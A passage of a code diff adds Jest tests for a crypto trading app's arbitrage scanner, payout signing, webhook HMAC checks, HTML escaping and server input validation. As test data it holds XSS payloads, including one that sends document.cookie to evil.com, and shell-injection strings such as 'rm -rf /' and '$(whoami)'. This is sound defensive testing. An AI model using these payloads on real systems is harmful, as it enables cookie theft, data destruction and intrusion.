+    const quoteProvider = async ({ dex, side, amountIn }) => {
+      if (side === "buy") {
+        return {
+          dex,
+          amountOut: amountIn / 2000,
+          slippageUSD: 1,
+          liquidityUSD: 250000,
+          timestamp: 1000,
+        };
+      }
+      return {
+        dex,
+        amountOut: amountIn * 2009,
+        slippageUSD: 1,
+        liquidityUSD: 250000,
+        timestamp: 1000,
+      };
+    };
+
+    const opportunities = await scanCrossDexFlashArb({
+      quoteProvider,
+      tokens: [{ symbol: "USDC" }, { symbol: "WETH" }],
+      dexes: ["Uniswap", "Aerodrome"],
+      borrowAmountsUSD: [10000],
+      riskState: createRiskState({ minNetProfitUSD: 10, minNetEdge: 0.0015, maxTradeSizeUSD: 20000 }),
+      config: { gasUSD: 3, mevBufferUSD: 2, minNetProfitUSD: 10, minROI: 0.0015 },
+      now: 1000,
+    });
+
+    expect(opportunities.length).toBeGreaterThan(0);
+    expect(opportunities[0].status).toBe("CANDIDATE");
+    expect(opportunities[0].dryRunOnly).toBe(true);
+    expect(opportunities[0].executionMode).toBe("FLASH_LOAN");
+  });
+
+  it("self-corrects and cools down arbitrage strategies after losses", () => {
+    const now = Date.now();
+    const riskState = createRiskState({ cooldownMs: 60000 });
+
+    recordOpportunityResult(
+      riskState,
+      {
+        strategy: "CROSS_DEX_FLASH_LOAN_ARB",
+        netPnlUSD: -12,
+        estimatedSlippageUSD: 1,
+        actualSlippageUSD: 2,
+      },
+      now,
+    );
+    recordOpportunityResult(
+      riskState,
+      { strategy: "CROSS_DEX_FLASH_LOAN_ARB", netPnlUSD: -8 },
+      now + 1,
+    );
+
+    const adjustment = getRiskAdjustment(riskState, "CROSS_DEX_FLASH_LOAN_ARB", now + 2);
+    expect(adjustment.blocked).toBe(true);
+    expect(adjustment.reasons).toContain("strategy_cooldown");
+    expect(adjustment.riskMultiplier).toBeLessThan(1);
+    expect(adjustment.minEdgeBump).toBeGreaterThan(0);
+  });
+});
+
+describe("Payout Service - Robustness & Security", () => {
+  const PayoutService = require('./services/payouts/payoutService');
+
+  it("handles missing private key gracefully", () => {
+    const service = new PayoutService({
+      rewardTokenAddress: "0x123",
+      payoutManagerAddress: "0x456",
+      chainId: 8453
+    });
+    expect(service.oracleWallet).toBe(null);
+  });
+
+  it("throws clear error when signing without wallet", async () => {
+    const service = new PayoutService({});
+    try {
+      await service.generatePayoutSignature("0xabc", "task-1", 100, 123);
+      throw new Error("Should have thrown");
+    } catch (e) {
+      expect(e.message).toBe("Oracle wallet not configured");
+    }
+  });
+
+  it("initializes wallet correctly when key provided", () => {
+    const wallet = require("ethers").Wallet.createRandom();
+    const service = new PayoutService({ oraclePrivateKey: wallet.privateKey });
+    expect(service.oracleWallet !== null).toBe(true);
+    expect(service.oracleWallet.address).toBe(wallet.address);
+  });
+});
+
+describe("Biconomy Nexus - Robustness & Security", () => {
+  const BiconomyNexus = require('./services/payouts/biconomyNexus');
+  const nexus = new BiconomyNexus({ payoutManagerAddress: "0x1234567890123456789012345678901234567890" });
+
+  it("rejects missing or non-object payload", () => {
+    try {
+      nexus.encodeClaimReward(null);
+      throw new Error("Should have thrown");
+    } catch (e) {
+      expect(e.message).toBe("Invalid or missing payoutData");
+    }
+  });
+
+  it("rejects malformed user addresses", () => {
+    try {
+      nexus.encodeClaimReward({ user: "0xInvalidAddress", taskId: "task-1", amount: 10, nonce: 1, signature: "0xabc" });
+      throw new Error("Should have thrown");
+    } catch (e) {
+      expect(e.message).toBe("Invalid user address");
+    }
+  });
+
+  it("rejects malformed taskIds", () => {
+    try {
+      nexus.encodeClaimReward({ user: "0x26fE35d19F481F376e862Aa70688a18Ae0237be5", taskId: "a".repeat(101), amount: 10, nonce: 1, signature: "0xabc" });
+      throw new Error("Should have thrown");
+    } catch (e) {
+      expect(e.message).toBe("Invalid taskId");
+    }
+  });
+
+  it("rejects malformed amounts", () => {
+    try {
+      nexus.encodeClaimReward({ user: "0x26fE35d19F481F376e862Aa70688a18Ae0237be5", taskId: "task-1", amount: "not-a-number", nonce: 1, signature: "0xabc" });
+      throw new Error("Should have thrown");
+    } catch (e) {
+      expect(e.message).toBe("Invalid amount");
+    }
+
+    try {
+      nexus.encodeClaimReward({ user: "0x26fE35d19F481F376e862Aa70688a18Ae0237be5", taskId: "task-1", amount: -50, nonce: 1, signature: "0xabc" });
+      throw new Error("Should have thrown");
+    } catch (e) {
+      expect(e.message).toBe("Invalid amount");
+    }
+  });
+
+  it("rejects malformed nonces", () => {
+    try {
+      nexus.encodeClaimReward({ user: "0x26fE35d19F481F376e862Aa70688a18Ae0237be5", taskId: "task-1", amount: "1000", nonce: "abc", signature: "0xabc" });
+      throw new Error("Should have thrown");
+    } catch (e) {
+      expect(e.message).toBe("Invalid nonce");
+    }
+  });
+
+  it("rejects malformed signature format", () => {
+    try {
+      nexus.encodeClaimReward({ user: "0x26fE35d19F481F376e862Aa70688a18Ae0237be5", taskId: "task-1", amount: "1000", nonce: "12345", signature: "not-0x-hex" });
+      throw new Error("Should have thrown");
+    } catch (e) {
+      expect(e.message).toBe("Invalid signature format");
+    }
+  });
+
+  it("passes and encodes valid payloads", () => {
+    const data = {
+      user: "0x26fE35d19F481F376e862Aa70688a18Ae0237be5",
+      taskId: "task-1",
+      amount: "1000",
+      nonce: "12345",
+      signature: "0xabcdef1234567890"
+    };
+    const callData = nexus.encodeClaimReward(data);
+    expect(typeof callData).toBe("string");
+    expect(callData.startsWith("0x")).toBe(true);
+  });
+});
+
+describe("MoonPay Webhook - Security Verification", () => {
+  const verifyMoonPaySignature = (body, signature, secret) => {
+    try {
+      const hmac = crypto.createHmac('sha256', secret);
+      const digest = hmac.update(JSON.stringify(body)).digest('hex');
+      const digestBuffer = Buffer.from(digest);
+      const signatureBuffer = Buffer.from(signature);
+      if (digestBuffer.length !== signatureBuffer.length) return false;
+      return crypto.timingSafeEqual(digestBuffer, signatureBuffer);
+    } catch (e) {
+      return false;
+    }
+  };
+
+  const secret = "test-secret-123";
+  const payload = { id: "trans_123", status: "completed", amount: 50 };
+  const validSignature = crypto.createHmac('sha256', secret).update(JSON.stringify(payload)).digest('hex');
+
+  it("validates a correct HMAC-SHA256 signature", () => {
+    const isValid = verifyMoonPaySignature(payload, validSignature, secret);
+    expect(isValid).toBe(true);
+  });
+
+  it("rejects an incorrect signature", () => {
+    const isInvalid = verifyMoonPaySignature(payload, "wrong-signature", secret);
+    expect(isInvalid).toBe(false);
+  });
+
+  it("rejects a correct signature with the wrong secret", () => {
+    const isInvalid = verifyMoonPaySignature(payload, validSignature, "wrong-secret");
+    expect(isInvalid).toBe(false);
+  });
+
+  it("prevents timing attacks using timingSafeEqual (logical check)", () => {
+    // This is more of a logic check that we are using the right function
+    // timingSafeEqual throws if lengths differ, which we handle
+    const shortSignature = "abc";
+    const isInvalid = verifyMoonPaySignature(payload, shortSignature, secret);
+    expect(isInvalid).toBe(false);
+  });
+});
+
+describe("Performance", () => {
+  it("generates IDs and computes indicators quickly", () => {
+    const engine = new TradingEngine();
+    const prices = Array(500)
+      .fill(2500)
+      .map((price, index) => price + Math.sin(index) * 50);
+    const start = Date.now();
+
+    for (let i = 0; i < 1000; i++) engine.generateId();
+    engine.analyzeVolatility(prices);
+    for (let i = 0; i < 100; i++) engine.calculatePositionSize(10, 3, 5);
+
+    expect(Date.now() - start).toBeLessThan(150);
+  });
+
+  it("calculates volatility with single-pass algorithm correctly", () => {
+    const engine = new TradingEngine();
+    // Use simple prices to make manual verification easy
+    // Returns: (2-1)/1 = 1, (3-2)/2 = 0.5
+    // Mean = (1 + 0.5) / 2 = 0.75
+    // Var = ((1^2 + 0.5^2) / 2) - 0.75^2 = (1.25 / 2) - 0.5625 = 0.625 - 0.5625 = 0.0625
+    // Vol = sqrt(0.0625) * 100 = 0.25 * 100 = 25%
+    const prices = [1, 2, 3];
+    const analysis = engine.analyzeVolatility(prices);
+
+    expect(parseFloat(analysis.current)).toBe(25.00);
+  });
+});
+
+// ─────────────────────────────────────────────────────────
+// escapeHTML is defined inside index.html as a browser script
+// and is not a Node module, so we replicate the implementation
+// here to enable unit-testing without a browser environment.
+// Keep this definition in sync with index.html:1304-1312.
+// ─────────────────────────────────────────────────────────
+const escapeHTML = (str) => {
+  if (!str) return '';
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#039;');
+};
+
+describe("escapeHTML - XSS Prevention (index.html:1304)", () => {
+  // ── Falsy / edge input ──────────────────────────────────
+  it("returns empty string for null", () => {
+    expect(escapeHTML(null)).toBe('');
+  });
+
+  it("returns empty string for undefined", () => {
+    expect(escapeHTML(undefined)).toBe('');
+  });
+
+  it("returns empty string for empty string", () => {
+    expect(escapeHTML('')).toBe('');
+  });
+
+  it("returns empty string for 0 (falsy number)", () => {
+    expect(escapeHTML(0)).toBe('');
+  });
+
+  it("returns empty string for false", () => {
+    expect(escapeHTML(false)).toBe('');
+  });
+
+  // ── Plain / safe input passes through unchanged ─────────
+  it("passes plain ASCII text through unchanged", () => {
+    expect(escapeHTML('BULL')).toBe('BULL');
+  });
+
+  it("passes alphanumeric mode string through unchanged", () => {
+    expect(escapeHTML('HIGH_VOL')).toBe('HIGH_VOL');
+  });
+
+  // ── Individual character escaping ───────────────────────
+  it("escapes & to &amp;", () => {
+    expect(escapeHTML('AT&T')).toBe('AT&amp;T');
+  });
+
+  it("escapes < to &lt;", () => {
+    expect(escapeHTML('a<b')).toBe('a&lt;b');
+  });
+
+  it("escapes > to &gt;", () => {
+    expect(escapeHTML('a>b')).toBe('a&gt;b');
+  });
+
+  it("escapes \" to &quot;", () => {
+    expect(escapeHTML('say "hi"')).toBe('say &quot;hi&quot;');
+  });
+
+  it("escapes ' to &#039;", () => {
+    expect(escapeHTML("it's")).toBe('it&#039;s');
+  });
+
+  // ── XSS payloads ────────────────────────────────────────
+  it("escapes a basic <script> XSS payload", () => {
+    const payload = '<script>alert(1)</script>';
+    const result = escapeHTML(payload);
+    expect(result).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
+  });
+
+  it("does not contain a raw < after escaping a script tag", () => {
+    const result = escapeHTML('<script>alert("xss")</script>');
+    expect(result.includes('<')).toBe(false);
+  });
+
+  it("escapes attribute-injection payload with double quotes", () => {
+    const payload = '" onmouseover="alert(1)';
+    const result = escapeHTML(payload);
+    expect(result).toBe('&quot; onmouseover=&quot;alert(1)');
+  });
+
+  it("escapes attribute-injection payload with single quotes", () => {
+    const payload = "' onload='alert(1)";
+    const result = escapeHTML(payload);
+    expect(result).toBe('&#039; onload=&#039;alert(1)');
+  });
+
+  it("escapes img onerror XSS payload", () => {
+    const payload = '<img src=x onerror=alert(1)>';
+    const result = escapeHTML(payload);
+    expect(result).toBe('&lt;img src=x onerror=alert(1)&gt;');
+  });
+
+  it("escapes a payload with all five special characters", () => {
+    const payload = '<a href="test" onclick=\'alert(1 & 2)\'>';
+    const result = escapeHTML(payload);
+    expect(result).toBe('&lt;a href=&quot;test&quot; onclick=&#039;alert(1 &amp; 2)&#039;&gt;');
+  });
+
+  // ── Non-string input coercion ────────────────────────────
+  it("converts a truthy number to its string representation", () => {
+    expect(escapeHTML(42)).toBe('42');
+  });
+
+  it("converts an object with toString to a string", () => {
+    const obj = { toString: () => '<BULL>' };
+    expect(escapeHTML(obj)).toBe('&lt;BULL&gt;');
+  });
+
+  // ── Regression: results.mode field from showCrucibleResults ──
+  it("REGRESSION: results.mode with XSS payload is safe for innerHTML", () => {
+    // Simulates the exact scenario fixed by the PR: a user-influenced
+    // results.mode reaching the Crucible modal innerHTML template.
+    const maliciousMode = '<script>fetch("https://evil.com?c="+document.cookie)</script>';
+    const escaped = escapeHTML(maliciousMode);
+    // Must not contain any raw angle brackets that would be parsed as tags
+    expect(escaped.includes('<')).toBe(false);
+    expect(escaped.includes('>')).toBe(false);
+    expect(escaped).toContain('&lt;script&gt;');
+  });
+
+  it("REGRESSION: benign mode strings are preserved exactly after escaping", () => {
+    // Verifies that the fix does not corrupt legitimate mode values
+    // such as those returned by simulateCrucibleV2Results.
+    const modes = ['BULL', 'BEAR', 'CHOP', 'HIGH_VOL', 'STRESS_1_5X'];
+    for (const mode of modes) {
+      expect(escapeHTML(mode)).toBe(mode);
+    }
+  });
+});
+
+describe("Server Input Validation - Sentinel Hardening", () => {
+  it("rejects oversized query string on /api/0x/quote endpoint", async () => {
+    const originalPort = process.env.PORT;
+    process.env.PORT = "0";
+
+    const express = require('express');
+    const http = require('http');
+    const originalListen = http.Server.prototype.listen;
+    let activeServer = null;
+    http.Server.prototype.listen = function(...args) {
+      activeServer = this;
+      return originalListen.apply(this, args);
+    };
+
+    delete require.cache[require.resolve("./server.js")];
+    delete require.cache[require.resolve("./routes/payoutRoutes.js")];
+    const { app, server } = require("./server.js");
+    activeServer = server;
+    if (!activeServer.listening) {
+      await new Promise((resolve) => activeServer.listen(0, resolve));
+    }
+    try {
+      const port = activeServer.address().port;
+      const oversizedParam = "a".repeat(2005);
+      const res = await fetch(`http://localhost:${port}/api/0x/quote?buyToken=WETH&sellToken=USDC&extra=${oversizedParam}`);
+      expect(res.status).toBe(400);
+      const data = await res.json();
+      expect(data.error).toBe('Query parameters too long');
+    } finally {
+      http.Server.prototype.listen = originalListen;
+      if (activeServer) {
+        activeServer.close();
+      }
+      process.env.PORT = originalPort;
+    }
+  });
+
+  it("validates validationToken timing-safe comparison with multibyte characters safely", () => {
+    const taskSecret = "secret-key";
+    const timingSafeCompare = (validationToken) => {
+      return typeof validationToken === 'string' && (() => {
+        const tokenBuf = Buffer.from(validationToken);
+        const secretBuf = Buffer.from(taskSecret);
+        return tokenBuf.length === secretBuf.length && crypto.timingSafeEqual(tokenBuf, secretBuf);
+      })();
+    };
+
+    expect(timingSafeCompare("secret-key")).toBe(true);
+    expect(timingSafeCompare("abcdefghij")).toBe(false);
+    expect(timingSafeCompare("short")).toBe(false);
+    expect(timingSafeCompare("äöüäßäöüäß")).toBe(false); // Same string length, different byte length, must not throw TypeError
+  });
+
+  it("validates Ethereum addresses correctly using ethers.isAddress", () => {
+    const { ethers } = require("ethers");
+    expect(ethers.isAddress("0x9F407b7f793555c35c33aC64bd6901759470736D")).toBe(true);
+    expect(ethers.isAddress("invalid-address")).toBe(false);
+    expect(ethers.isAddress("")).toBe(false);
+  });
+
+  it("checks numeric validation logic used for reward", () => {
+    const isValidReward = (reward) => {
+      return typeof reward === 'number' && !isNaN(reward) && isFinite(reward) && reward > 0 && reward <= 100;
+    };
+    expect(isValidReward(10)).toBe(true);
+    expect(isValidReward(-5)).toBe(false);
+    expect(isValidReward(NaN)).toBe(false);
+    expect(isValidReward(Infinity)).toBe(false);
+    expect(isValidReward(101)).toBe(false);
+    expect(isValidReward("10")).toBe(false);
+  });
+
+  it("validates taskId format and length correctly", () => {
+    const isValidTaskId = (taskId) => {
+      return !!(taskId && typeof taskId === 'string' && taskId.length <= 100);
+    };
+    expect(isValidTaskId("task-123")).toBe(true);
+    expect(isValidTaskId("")).toBe(false);
+    expect(isValidTaskId(null)).toBe(false);
+    expect(isValidTaskId(123)).toBe(false);
+    expect(isValidTaskId("a".repeat(101))).toBe(false);
+  });
+
+  it("validates proofOfWork format and length correctly", () => {
+    const isValidProofOfWork = (proofOfWork) => {
+      return !!(proofOfWork && typeof proofOfWork === 'string' && proofOfWork.length <= 1000);
+    };
+    expect(isValidProofOfWork("proof-data")).toBe(true);
+    expect(isValidProofOfWork("")).toBe(false);
+    expect(isValidProofOfWork(null)).toBe(false);
+    expect(isValidProofOfWork({})).toBe(false);
+    expect(isValidProofOfWork("a".repeat(1001))).toBe(false);
+  });
+
+  it("validates user login input types, formats, and lengths correctly", () => {
+    const validateLoginInput = (email, address, name, provider, avatar) => {
+      const userId = email || address;
+      if (!userId || typeof userId !== 'string' || userId.length > 100) return false;
+      const dangerousProps = ['__proto__', 'constructor', 'prototype'];
+      if (dangerousProps.includes(userId) || (email && dangerousProps.includes(email)) || (address && dangerousProps.includes(address))) return false;
+      if (email && (typeof email !== 'string' || email.length > 100 || !email.includes('@'))) return false;
+      if (address && (typeof address !== 'string' || address.length > 100 || !require("ethers").isAddress(address))) return false;
+      if (name && (typeof name !== 'string' || name.length > 100)) return false;
+      if (provider && (typeof provider !== 'string' || provider.length > 50)) return false;
+      if (avatar && (typeof avatar !== 'string' || avatar.length > 500)) return false;
+      return true;
+    };
+
+    expect(validateLoginInput("palette@trade-arena.com", "0x9F407b7f793555c35c33aC64bd6901759470736D", "Arena Trader", "privy", null)).toBe(true);
+    expect(validateLoginInput("invalid-email", "0x9F407b7f793555c35c33aC64bd6901759470736D")).toBe(false);
+    expect(validateLoginInput("palette@trade-arena.com", "invalid-address")).toBe(false);
+    expect(validateLoginInput("__proto__", "0x9F407b7f793555c35c33aC64bd6901759470736D")).toBe(false);
+    expect(validateLoginInput("palette@trade-arena.com", "0x9F407b7f793555c35c33aC64bd6901759470736D", "A".repeat(101))).toBe(false);
+    expect(validateLoginInput("palette@trade-arena.com", "0x9F407b7f793555c35c33aC64bd6901759470736D", "Arena Trader", "A".repeat(51))).toBe(false);
+  });
+
+  it("validates swap parameters correctly", () => {
+    const isValidSwapInput = (fromToken, toToken, amount, slippage) => {
+      if (!fromToken || typeof fromToken !== 'string' || fromToken.length > 100) return false;
+      if (!toToken || typeof toToken !== 'string' || toToken.length > 100) return false;
+      if (typeof amount !== 'number' || isNaN(amount) || !isFinite(amount) || amount <= 0) return false;
+      if (slippage !== undefined) {
+        if (typeof slippage !== 'number' || isNaN(slippage) || !isFinite(slippage) || slippage < 0 || slippage > 1) return false;
+      }
+      return true;
+    };
+
+    expect(isValidSwapInput("USDC", "WETH", 100)).toBe(true);
+    expect(isValidSwapInput("0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE", 100)).toBe(true); // Contract addresses
+    expect(isValidSwapInput("USDC", "WETH", 100, 0.005)).toBe(true);
+    expect(isValidSwapInput("USDC", "WETH", 100, 0)).toBe(true);
+
+    // Invalid fromToken/toToken
+    expect(isValidSwapInput(123, "WETH", 100)).toBe(false);
+    expect(isValidSwapInput("USDC", "", 100)).toBe(false);
+    expect(isValidSwapInput("USDC", "WETH".repeat(30), 100)).toBe(false);
+
+    // Invalid amount
+    expect(isValidSwapInput("USDC", "WETH", "100")).toBe(false);
+    expect(isValidSwapInput("USDC", "WETH", 0)).toBe(false);
+    expect(isValidSwapInput("USDC", "WETH", -10)).toBe(false);
+    expect(isValidSwapInput("USDC", "WETH", NaN)).toBe(false);
+    expect(isValidSwapInput("USDC", "WETH", Infinity)).toBe(false);
+
+    // Invalid slippage
+    expect(isValidSwapInput("USDC", "WETH", 100, "0.01")).toBe(false);
+    expect(isValidSwapInput("USDC", "WETH", 100, -0.01)).toBe(false);
+    expect(isValidSwapInput("USDC", "WETH", 100, 1.05)).toBe(false);
+    expect(isValidSwapInput("USDC", "WETH", 100, NaN)).toBe(false);
+    expect(isValidSwapInput("USDC", "WETH", 100, Infinity)).toBe(false);
+  });
+
+  it("validates bot creation parameters correctly", () => {
+    const isValidBotInput = (name, strategy, riskLevel, initialCapital, userAddress) => {
+      if (!name || typeof name !== 'string' || name.length > 100) return false;
+      if (!strategy || typeof strategy !== 'string' || strategy.length > 100) return false;
+      if (!riskLevel || typeof riskLevel !== 'string' || riskLevel.length > 100) return false;
+      if (typeof initialCapital !== 'number' || isNaN(initialCapital) || !isFinite(initialCapital) || initialCapital < 0 || initialCapital > 1000000000) return false;
+      if (userAddress !== undefined && userAddress !== null) {
+        if (typeof userAddress !== 'string' || userAddress.length > 100 || (userAddress !== 'demo' && !require("ethers").isAddress(userAddress))) return false;
+      }
+      return true;
+    };
+
+    expect(isValidBotInput("My Arbitrage Bot", "Arbitrage Detection", "Conservative (2x leverage)", 1000)).toBe(true);
+    expect(isValidBotInput("My Arbitrage Bot", "Arbitrage Detection", "Conservative (2x leverage)", 1000, "0x9F407b7f793555c35c33aC64bd6901759470736D")).toBe(true);
+    expect(isValidBotInput("My Arbitrage Bot", "Arbitrage Detection", "Conservative (2x leverage)", 1000, "demo")).toBe(true);
+
+    // Invalid string fields
+    expect(isValidBotInput("", "Arbitrage Detection", "Conservative (2x leverage)", 1000)).toBe(false);
+    expect(isValidBotInput("My Arbitrage Bot", "", "Conservative (2x leverage)", 1000)).toBe(false);
+    expect(isValidBotInput("My Arbitrage Bot", "Arbitrage Detection", "", 1000)).toBe(false);
+    expect(isValidBotInput("A".repeat(101), "Arbitrage Detection", "Conservative (2x leverage)", 1000)).toBe(false);
+
+    // Invalid initialCapital
+    expect(isValidBotInput("My Bot", "Arbitrage Detection", "Conservative (2x leverage)", "1000")).toBe(false);
+    expect(isValidBotInput("My Bot", "Arbitrage Detection", "Conservative (2x leverage)", -10)).toBe(false);
+    expect(isValidBotInput("My Bot", "Arbitrage Detection", "Conservative (2x leverage)", NaN)).toBe(false);
+    expect(isValidBotInput("My Bot", "Arbitrage Detection", "Conservative (2x leverage)", Infinity)).toBe(false);
+
+    // Invalid userAddress
+    expect(isValidBotInput("My Bot", "Arbitrage Detection", "Conservative (2x leverage)", 1000, "invalid-address")).toBe(false);
+    expect(isValidBotInput("My Bot", "Arbitrage Detection", "Conservative (2x leverage)", 1000, 123)).toBe(false);
+    expect(isValidBotInput("My Bot", "Arbitrage Detection", "Conservative (2x leverage)", 1000, "a".repeat(101))).toBe(false);
+  });
+
+  it("validates agent CLI submit-token input correctly to prevent command injection", () => {
+    const isValidTokenInput = (token) => {
+      if (!token || typeof token !== 'string' || token.length > 500 || !/^[a-zA-Z0-9_\-]+$/.test(token)) {
+        return false;
+      }
+      return true;
+    };
+
+    // Valid tokens
+    expect(isValidTokenInput("valid_token_123")).toBe(true);
+    expect(isValidTokenInput("sample-token-abc123XYZ")).toBe(true);
+
+    // Invalid or command injection payloads
+    expect(isValidTokenInput(null)).toBe(false);
+    expect(isValidTokenInput(undefined)).toBe(false);
+    expect(isValidTokenInput(12345)).toBe(false);
+    expect(isValidTokenInput("")).toBe(false);
+    expect(isValidTokenInput("a".repeat(501))).toBe(false);
+    expect(isValidTokenInput('token"; calc.exe "')).toBe(false);
+    expect(isValidTokenInput("token; rm -rf /")).toBe(false);
+    expect(isValidTokenInput("token && echo hacked")).toBe(false);
+    expect(isValidTokenInput("token$(whoami)")).toBe(false);
+    expect(isValidTokenInput("token`id`")).toBe(false);
+    expect(isValidTokenInput("token|ls")).toBe(false);
+  });
+
+  it("validates task claim and payout userAddress with type safety and anchored regex", () => {
+    const isValidEarlyAddress = (userAddress) => {
+      return !!(userAddress && typeof userAddress === 'string' && userAddress !== 'demo' && /^0x[a-fA-F0-9]{40}$/.test(userAddress));
+    };
+
+    expect(isValidEarlyAddress("0x9F407b7f793555c35c33aC64bd6901759470736D")).toBe(true);
+    expect(isValidEarlyAddress("demo")).toBe(false);
+    expect(isValidEarlyAddress("0x9F407b7f793555c35c33aC64bd6901759470736D.evil.com")).toBe(false);
+    expect(isValidEarlyAddress(["0x9F407b7f793555c35c33aC64bd6901759470736D"])).toBe(false);
+    expect(isValidEarlyAddress(null)).toBe(false);
+    expect(isValidEarlyAddress(undefined)).toBe(false);
+    expect(isValidEarlyAddress(123)).toBe(false);
+  });
+
+  it("enforces strict type-safety and length limit checks on the /api/maintenance/log endpoint", async () => {
+    const originalPort = process.env.PORT;
+    process.env.PORT = "0";
+
+    const express = require('express');
+    const http = require('http');
+    const originalListen = http.Server.prototype.listen;
+    let activeServer = null;
+    http.Server.prototype.listen = function(...args) {
+      activeServer = this;
+      return originalListen.apply(this, args);
+    };
+
+    delete require.cache[require.resolve("./server.js")];
+    delete require.cache[require.resolve("./routes/payoutRoutes.js")];
+    const { app, server } = require("./server.js");
+    activeServer = server;
+    if (!activeServer.listening) {
+      await new Promise((resolve) => activeServer.listen(0, resolve));
+    }
+    try {
+      const port = activeServer.address().port;
+
+      // 1. Valid payload - should succeed
+      const res1 = await fetch(`http://localhost:${port}/api/maintenance/log`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ agent: "TEST-AGENT", message: "Everything is fine", level: "INFO" })
+      });
+      expect(res1.status).toBe(200);
+
+      // 2. Invalid payload (non-string agent) - should be rejected with 400
+      const res2 = await fetch(`http://localhost:${port}/api/maintenance/log`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ agent: 123, message: "Everything is fine" })
+      });
+      expect(res2.status).toBe(400);
+
+      // 3. Invalid payload (too long agent) - should be rejected with 400
+      const res3 = await fetch(`http://localhost:${port}/api/maintenance/log`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ agent: "A".repeat(101), message: "Everything is fine" })
+      });
+      expect(res3.status).toBe(400);
+
+      // 4. Invalid payload (too long message) - should be rejected with 400
+      const res4 = await fetch(`http://localhost:${port}/api/maintenance/log`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ agent: "TEST-AGENT", message: "M".repeat(501) })
+      });
+      expect(res4.status).toBe(400);
+
+      // 5. Invalid payload (too long level) - should be rejected with 400
+      const res5 = await fetch(`http://localhost:${port}/api/maintenance/log`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ agent: "TEST-AGENT", message: "Fine", level: "L".repeat(21) })
+      });
+      expect(res5.status).toBe(400);
+
+    } finally {
+      http.Server.prototype.listen = originalListen;
+      if (activeServer) {
+        activeServer.close();
+      }
+      process.env.PORT = originalPort;
+    }
+  });
+
+  it("enforces strict type-safety and length limit checks on the /api/maintenance/patch endpoint", async () => {
+    const originalPort = process.env.PORT;
+    process.env.PORT = "0";
+
+    const express = require('express');
+    const http = require('http');
+    const originalListen = http.Server.prototype.listen;
+    let activeServer = null;
+    http.Server.prototype.listen = function(...args) {
+      activeServer = this;
+      return originalListen.apply(this, args);
+    };
+
+    delete require.cache[require.resolve("./server.js")];
+    delete require.cache[require.resolve("./routes/payoutRoutes.js")];
+    const { app, server } = require("./server.js");
+    activeServer = server;
+    if (!activeServer.listening) {
+      await new Promise((resolve) => activeServer.listen(0, resolve));
+    }
+    try {
+      const port = activeServer.address().port;
+
+      // 1. Valid payload - should succeed (logged for review, 200 OK)
+      const res1 = await fetch(`http://localhost:${port}/api/maintenance/patch`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ filepath: "public/index.html", patch: "diff content", description: "update title" })
+      });
+      expect(res1.status).toBe(200);
+
+      // 2. Invalid payload (non-string patch) - should be rejected with 400
+      const res2 = await fetch(`http://localhost:${port}/api/maintenance/patch`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ filepath: "public/index.html", patch: { code: "invalid" } })
+      });
+      expect(res2.status).toBe(400);
+
+      // 3. Invalid payload (too long description) - should be rejected with 400
+      const res3 = await fetch(`http://localhost:${port}/api/maintenance/patch`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ filepath: "public/index.html", patch: "diff", description: "D".repeat(1001) })
+      });
+      expect(res3.status).toBe(400);
+
+      // 4. Invalid payload (too long patch) - should be rejected with 400
+      const res4 = await fetch(`http://localhost:${port}/api/maintenance/patch`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ filepath: "public/index.html", patch: "P".repeat(50001), description: "patch too big" })
+      });
+      expect(res4.status).toBe(400);
+
+    } finally {
+      http.Server.prototype.listen = originalListen;
+      if (activeServer) {
+        activeServer.close();
+      }
+      process.env.PORT = originalPort;
+    }
+  });
+});
+
+describe("Faucet Claim - Sentinel Hardening", () => {
+  it("rejects duplicate faucet claims for the same Ethereum address", async () => {
+    const originalPort = process.env.PORT;
+    process.env.PORT = "0";
+
+    const express = require('express');
+    const http = require('http');
+    const originalListen = http.Server.prototype.listen;
+    let activeServer = null;
+    http.Server.prototype.listen = function(...args) {
+      activeServer = this;
+      return originalListen.apply(this, args);
+    };
+
+    delete require.cache[require.resolve("./server.js")];
+    delete require.cache[require.resolve("./routes/payoutRoutes.js")];
+    const { app, server } = require("./server.js");
+    activeServer = server;
+    if (!activeServer.listening) {
+      await new Promise((resolve) => activeServer.listen(0, resolve));
+    }
+    try {
+      const port = activeServer.address().port;
+      const testAddress = "0x9F407b7f793555c35c33aC64bd6901759470736D";
+
+      // First request - should succeed
+      const res1 = await fetch(`http://localhost:${port}/api/faucet/claim`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ userAddress: testAddress })
+      });
+      const data1 = await res1.json();
+      expect(res1.status).toBe(200);
+      expect(data1.success).toBe(true);
+
+      // Second request with same address (even case insensitive) - should be rejected with 429
+      const res2 = await fetch(`http://localhost:${port}/api/faucet/claim`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ userAddress: testAddress.toLowerCase() })
+      });
+      const data2 = await res2.json();
+      expect(res2.status).toBe(429);
+      expect(data2.success).toBe(false);
+      expect(data2.error).toBe('Faucet already claimed for this address');
+    } finally {
+      http.Server.prototype.listen = originalListen;
+      if (activeServer) {
+        activeServer.close();
+      }
+      process.env.PORT = originalPort;
+    }
+  });
+
+  it("caches /api/diagnostics/full results to prevent RPC spam", async () => {
+    const originalPort = process.env.PORT;
+    process.env.PORT = "0";
+
+    const express = require('express');
+    const http = require('http');
+    const originalListen = http.Server.prototype.listen;
+    let activeServer = null;
+    http.Server.prototype.listen = function(...args) {
+      activeServer = this;
+      return originalListen.apply(this, args);
+    };
+
+    delete require.cache[require.resolve("./server.js")];
